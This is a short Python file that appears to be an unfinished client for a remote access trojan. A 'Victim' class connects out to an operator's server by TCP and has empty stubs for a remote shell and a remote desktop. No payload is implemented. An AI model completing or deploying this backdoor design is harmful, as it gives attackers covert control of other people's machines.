from socket import socket, AF_INET, SOCK_STREAM


class Victim:

    def __init__(self, server_ip, server_port):
        self.SERVER_IP = server_ip
        self.SERVER_PORT = server_port
        self.ADDR = (self.SERVER_IP, self.SERVER_PORT)
        self.victim = socket(AF_INET, SOCK_STREAM)
        self.connected = True

    def main(self):
        self.__connect()

    def __connect(self):
        self.victim.connect(self.ADDR)

    def __on_connect(self, conn, addr):
        pass

    def __start_remote_desktop(self):
        pass

    def __start_remote_shell(self):
        pass